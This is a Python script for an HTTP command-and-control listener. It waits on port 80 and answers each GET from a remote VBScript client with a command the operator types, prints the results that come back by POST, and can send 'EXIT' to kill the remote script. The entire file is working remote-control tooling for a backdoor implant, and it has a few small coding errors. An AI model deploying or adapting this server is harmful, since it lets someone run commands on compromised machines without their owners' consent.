#!/usr/bin/env python3
import re, socket, socketserver, sys, threading, time

ListeningHost = "0.0.0.0"
ListeningPort = 80

# Initial requests are limited to a 1KB size, until the Content-Length header can be found.
MaxRecvSize = 1024

# Regular expression for finding the Content-Length header.
ContentLengthRe = re.compile("Content-Length: (?P<ContentLength>\d+)")

class ThreadedTCPRequestHandler(socketserver.BaseRequestHandler):
    def handle(self):
        self.data = str(self.request.recv(MaxRecvSize), "utf-8")
        ContentLengthMatch = ContentLengthRe.search(self.data)
        if ContentLengthMatch:
            try:
                print("[*] Request Content-Length larger than MaxRecvSize - Receiving remaining data...")
                if int(ContentLengthMatch.group("ContentLength")) > MaxRecvSize:
                    self.data += str(self.request.recv(int(ContentLengthMatch.group("ContentLength"))), "utf-8")
            except:
                print("[-] Unable to find, parse, and validate Content-Length field in request - abandoning connection.")
                return
        
        SourceAddress, SourcePort = self.request.getpeername()
        print("[+] Connection from {}:{}".format(SourceAddress, SourcePort))
        
        if len(self.data) == 0:
            return

        elif self.data.strip().startswith("GET"):
            command = input("%s > " % self.client_address[0])
            if command.strip() == "EXIT":
                print("[!] Terminating remote VBS client script...")
            response = (b"HTTP/1.1 200\ncontent-length: " + str(len(command.encode("UTF-8"))).encode("UTF-8") + b"\n\n" + command.encode("UTF-8"))
            self.request.sendall(response)
            if command.strip() == "EXIT":
                print("[+] Successfully sent terminate command to remote VBS client script. Use ctrl+c to shutdown the server or wait for another connection.")

        elif self.data.strip().startswith("POST"):
            print(self.data + "\r\n")
            response = (b"HTTP/1.1 200\ncontent-length: 0\n\n")
            self.request.sendall(response)

        else:
            print(self.data("UTF-8"))
            response = (b"HTTP/1.1 300\ncontent-length: 0\n\n")
            self.request.sendall(response)

class ThreadedTCPServer(socketserver.ThreadingMixIn, socketserver.TCPServer):
    pass        

if __name__ == "__main__":
    print("[!] Type 'EXIT' to kill the remote VBS script. Then ctrl+c to shutdown local server.")
    
    # Create a new threaded server.
    server = ThreadedTCPServer((ListeningHost, ListeningPort), ThreadedTCPRequestHandler)
    ip, port = server.server_address
    
    # Start the server's thread, which will start threads for each new connection.
    server_thread = threading.Thread(target=server.serve_forever)
    
    # Exit the server thread when the main thread terminates.
    server_thread.daemon = True
    server_thread.start()
    
    print("[*] Started server listening on {}:{} ({})".format(ip, port, server_thread.name))
    while True:
        try:
            time.sleep(1)
        except KeyboardInterrupt:
            break
        except:
            break

    print("[*] Cleaning up local server...")
    server.shutdown()
    server.server_close()
    print("[+] Done.")
    
    
